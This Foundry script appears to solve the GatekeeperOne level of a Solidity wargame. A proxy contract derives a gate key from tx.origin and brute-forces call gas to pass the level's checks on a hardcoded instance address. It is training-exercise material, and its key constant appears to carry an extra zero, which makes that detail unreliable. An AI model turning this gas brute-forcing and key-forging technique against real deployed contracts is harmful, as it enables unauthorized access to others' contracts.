// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "../src/levels/13-GatekeeperOne/GatekeeperOne.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";


contract ProxyAttcker {
    GatekeeperOne gatekeeperInstance;

    constructor(GatekeeperOne _gatekeeperInstance) {
        gatekeeperInstance = _gatekeeperInstance;
    }

    function attack() public {
        bytes8 _gateKey = bytes8(uint64(0xffffffff000000000 + uint16(uint160(tx.origin))));
        for(uint i =0; i < 1000; i +=1) {
            (bool success, ) = address(gatekeeperInstance).call{gas: i + 8191 * 3}(abi.encodeWithSignature("enter(bytes8)", _gateKey));
            if(gatekeeperInstance.entrant() == tx.origin){
                console.log("success : ", i);
                break;
            }
        }
        
    }
}

contract Level13Solution is Script {
    GatekeeperOne gatekeeperInstance = GatekeeperOne(0x0675a9dAfe88E47EEb0A4757d88Fd92108aF102f);

    function run() public{
        vm.startBroadcast();
        
        ProxyAttcker proxyAttcker = new ProxyAttcker(gatekeeperInstance);
        proxyAttcker.attack();
        
        console.log("tx.origin : ", tx.origin);
        console.log("enter : ", gatekeeperInstance.entrant());
        

        vm.stopBroadcast();
    }
}